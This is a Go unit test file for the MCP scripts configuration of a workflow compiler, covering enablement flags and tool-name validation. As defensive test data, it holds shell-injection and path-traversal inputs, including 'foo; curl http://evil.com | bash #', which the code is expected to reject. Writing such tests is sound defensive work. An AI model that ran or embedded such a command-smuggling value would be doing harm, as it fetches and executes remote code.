//go:build !integration

package workflow

import (
	"testing"
)

func TestHasMCPScripts(t *testing.T) {
	tests := []struct {
		name     string
		config   *MCPScriptsConfig
		expected bool
	}{
		{
			name:     "nil config",
			config:   nil,
			expected: false,
		},
		{
			name:     "empty tools",
			config:   &MCPScriptsConfig{Tools: map[string]*MCPScriptToolConfig{}},
			expected: false,
		},
		{
			name: "with tools",
			config: &MCPScriptsConfig{
				Tools: map[string]*MCPScriptToolConfig{
					"test": {Name: "test", Description: "Test tool"},
				},
			},
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := HasMCPScripts(tt.config)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestIsMCPScriptsEnabled(t *testing.T) {
	// Test config with tools
	configWithTools := &MCPScriptsConfig{
		Tools: map[string]*MCPScriptToolConfig{
			"test": {Name: "test", Description: "Test tool"},
		},
	}

	tests := []struct {
		name         string
		config       *MCPScriptsConfig
		workflowData *WorkflowData
		expected     bool
	}{
		{
			name:         "nil config - not enabled",
			config:       nil,
			workflowData: nil,
			expected:     false,
		},
		{
			name:         "empty tools - not enabled",
			config:       &MCPScriptsConfig{Tools: map[string]*MCPScriptToolConfig{}},
			workflowData: nil,
			expected:     false,
		},
		{
			name:         "with tools - enabled by default",
			config:       configWithTools,
			workflowData: nil,
			expected:     true,
		},
		{
			name:   "with tools and feature flag enabled - enabled (backward compat)",
			config: configWithTools,
			workflowData: &WorkflowData{
				Features: map[string]any{"mcp-scripts": true},
			},
			expected: true,
		},
		{
			name:   "with tools and feature flag disabled - still enabled (feature flag ignored)",
			config: configWithTools,
			workflowData: &WorkflowData{
				Features: map[string]any{"mcp-scripts": false},
			},
			expected: true,
		},
		{
			name:   "with tools and other features - enabled",
			config: configWithTools,
			workflowData: &WorkflowData{
				Features: map[string]any{"other-feature": true},
			},
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsMCPScriptsEnabled(tt.config, tt.workflowData)
			if result != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, result)
			}
		})
	}
}

func TestIsMCPScriptsEnabledWithEnv(t *testing.T) {
	// Test config with tools
	configWithTools := &MCPScriptsConfig{
		Tools: map[string]*MCPScriptToolConfig{
			"test": {Name: "test", Description: "Test tool"},
		},
	}

	// MCP Scripts are enabled by default when configured, environment variable no longer needed
	t.Run("with tools - enabled regardless of GH_AW_FEATURES", func(t *testing.T) {
		t.Setenv("GH_AW_FEATURES", "mcp-scripts")
		result := IsMCPScriptsEnabled(configWithTools, nil)
		if !result {
			t.Errorf("Expected true, got false")
		}
	})

	t.Run("with tools and GH_AW_FEATURES=other - still enabled", func(t *testing.T) {
		t.Setenv("GH_AW_FEATURES", "other")
		result := IsMCPScriptsEnabled(configWithTools, nil)
		if !result {
			t.Errorf("Expected true, got false")
		}
	})
}

// TestParseMCPScriptsAndExtractMCPScriptsConfigConsistency verifies that ParseMCPScripts
// and extractMCPScriptsConfig produce identical results for the same input.
// This ensures both functions use the shared helper correctly.

// TestValidateMCPScriptToolName tests the toolName validation function.
func TestValidateMCPScriptToolName(t *testing.T) {
	validNames := []string{
		"mytool",
		"my-tool",
		"my_tool",
		"Tool1",
		"fetch-data",
		"fetchData",
		"a",
		"A1_b-C",
		// 64 characters (max allowed)
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab",
	}
	for _, name := range validNames {
		t.Run("valid_"+name, func(t *testing.T) {
			if err := validateMCPScriptToolName(name); err != nil {
				t.Errorf("Expected valid tool name %q to pass validation, got error: %v", name, err)
			}
		})
	}

	invalidNames := []string{
		"",
		"1tool",    // starts with digit
		"-tool",    // starts with hyphen
		"_tool",    // starts with underscore
		"foo bar",  // space
		"foo;bar",  // semicolon (shell injection)
		"foo|bar",  // pipe (shell injection)
		"foo&bar",  // ampersand (shell injection)
		"foo$bar",  // dollar (shell injection)
		"foo/bar",  // path separator
		"../evil",  // path traversal
		"foo\nbar", // newline
		"foo\tbar", // tab
		"foo`bar",  // backtick
		"foo>bar",  // redirect
		"foo<bar",  // redirect
		"foo!bar",  // exclamation
		// 65 characters (one over max)
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abc",
	}
	for _, name := range invalidNames {
		t.Run("invalid", func(t *testing.T) {
			if err := validateMCPScriptToolName(name); err == nil {
				t.Errorf("Expected invalid tool name %q to fail validation, but it passed", name)
			}
		})
	}
}

// TestParseMCPScriptsMapRejectsInvalidToolName verifies that parseMCPScriptsMap returns
// an error for tool names containing shell metacharacters or path traversal sequences.
func TestParseMCPScriptsMapRejectsInvalidToolName(t *testing.T) {
	maliciousNames := []string{
		"foo; curl http://evil.com | bash #",
		"foo|bar",
		"../evil",
		"foo$HOME",
	}
	for _, toolName := range maliciousNames {
		t.Run("reject_"+toolName, func(t *testing.T) {
			m := map[string]any{
				toolName: map[string]any{
					"description": "evil tool",
					"script":      "return 'hi';",
				},
			}
			_, _, err := parseMCPScriptsMap(m)
			if err == nil {
				t.Errorf("Expected parseMCPScriptsMap to reject tool name %q but it succeeded", toolName)
			}
		})
	}
}

// TestExtractMCPScriptsConfigRejectsInvalidToolName verifies that compiler extraction
// returns an error for invalid tool names.
func TestExtractMCPScriptsConfigRejectsInvalidToolName(t *testing.T) {
	frontmatter := map[string]any{
		"mcp-scripts": map[string]any{
			"foo; evil": map[string]any{
				"description": "injected tool",
				"script":      "return 1;",
			},
		},
	}
	_, err := (&Compiler{}).extractMCPScriptsConfig(frontmatter)
	if err == nil {
		t.Error("Expected extractMCPScriptsConfig to return error for invalid tool name, got nil")
	}
}

// TestMergeMCPScriptsRejectsInvalidToolName verifies that mergeMCPScripts returns an error
// when an imported config contains an invalid tool name.
func TestMergeMCPScriptsRejectsInvalidToolName(t *testing.T) {
	compiler := &Compiler{}
	main := &MCPScriptsConfig{Tools: make(map[string]*MCPScriptToolConfig)}
	importedJSON := `{"foo|evil": {"description": "bad", "script": "return 0;"}}`
	_, err := compiler.mergeMCPScripts(main, []string{importedJSON})
	if err == nil {
		t.Error("Expected mergeMCPScripts to return error for invalid imported tool name, got nil")
	}
}
